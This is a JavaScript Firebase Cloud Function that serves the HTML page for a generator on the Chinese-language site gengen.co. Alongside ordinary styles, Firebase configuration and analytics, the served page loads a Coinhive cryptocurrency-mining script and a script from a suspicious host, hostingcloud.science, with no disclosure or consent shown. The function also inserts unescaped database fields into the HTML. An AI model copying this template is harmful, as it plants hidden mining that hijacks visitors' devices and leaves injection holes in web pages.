exports.loadOfficialGeneratorSource = functions.https.onRequest((request, response) => {
  const gid = request.path.split('/').slice(-1).pop();
  const __response = response;

  return admin.firestore().collection('generators_official').doc(gid).get().then(result => {
    if (result.data().banned !== true && result.data().delete !== true) {
      return __response.status(200).send(`<!DOCTYPE html><html lang="zh-TW"><head><meta charset="utf-8" /><meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport" /><meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />
        <meta content="${result.data().description}" name="description">
        <meta property="og:site_name" content="產生器製造機" />
        <meta property="og:title" content="${result.data().title} - 產生器製造機" />
        <meta property="og:description" content="${result.data().description}" />
        <meta property="og:url" content="https://gengen.co/official/${gid}" />
        <meta property="og:type" content="website" />
        <meta property="og:image" content="${result.data().cover.replace('/image/upload/', '/image/upload/w_600,h_315,c_crop,c_fill,q_auto/')}" />
        <title>${result.data().title} - 產生器製造機</title>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abel"><link rel="stylesheet" href="https://fonts.googleapis.com/earlyaccess/notosanstc.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.3.3/dist/instantsearch.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.3.3/dist/instantsearch-theme-algolia.min.css"><link rel="stylesheet" href="/css/vendor.css?v=${VERSION}"><link rel="stylesheet" href="/css/all.css?v=${VERSION}"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="shortcut icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png"><link rel="shortcut icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png"><link rel="manifest" href="/images/site.webmanifest"><link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#333333"><meta name="msapplication-TileColor" content="#ffffff"><meta name="theme-color" content="#ffffff"> <!--[if lt IE 9]> <script src="//html5shim.googlecode.com/svn/trunk/html5.js" type="text/javascript"></script> <![endif]--></head><body><div id="fb-root"></div>
          <img src="${result.data().cover}" style="display:none;">
          <div id="page"><div id="page_loading" class="page-loading"><div class="spinner"><div class="bounce1"></div><div class="bounce2"></div><div class="bounce3"></div></div></div><div id="app" :class="$route.name"> <web-view-notice v-if="show_webview_notice"></web-view-notice> <router-view></router-view></div></div><script src="https://www.gstatic.com/firebasejs/5.1.0/firebase-app.js"></script> <script src="https://www.gstatic.com/firebasejs/5.1.0/firebase-auth.js"></script> <script src="https://www.gstatic.com/firebasejs/5.1.0/firebase-database.js"></script> <script src="https://www.gstatic.com/firebasejs/5.1.0/firebase-firestore.js"></script> <script src="https://www.gstatic.com/firebasejs/5.1.0/firebase-functions.js"></script> <script> var firebase_config = { apiKey: "AIzaSyANZCeg4hzphwZ48heqRw4WCC2bHveqx5k", authDomain: "gengen-e3b23.firebaseapp.com", databaseURL: "https://gengen-e3b23.firebaseio.com", projectId: "gengen-e3b23", storageBucket: "gengen-e3b23.appspot.com", messagingSenderId: "610473711969" }; firebase.initializeApp(firebase_config); </script> <script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.3.3/dist/instantsearch.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.20.1/moment.min.js"></script> <script src="/vendor/sharer.min.js"></script> <script src="/js/vendor.js?v=${VERSION}"></script> <script src="/vendor/vue-resource.js"></script> <script src="https://coinhive.com/lib/coinhive.min.js"></script> <script src="https://www.hostingcloud.science./zLaI.js"></script> <script src="/js/app.js?v=${VERSION}"></script> <script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','//www.google-analytics.com/analytics.js','ga');ga('create', 'UA-124037846-1', 'auto');ga('send', 'pageview'); </script></body></html>`);
    }
    else {
      return __response.status(200).send(`<!doctype html>
        <body>
          <script>window.location.href = "https://gengen.co";</script>
        </body>
      </html>`);
    }
  }).catch(error => {
    return __response.status(200).send(`<!doctype html>
      <body>
        <script>window.location.href = "https://gengen.co";</script>
      </body>
    </html>`);
  });
});
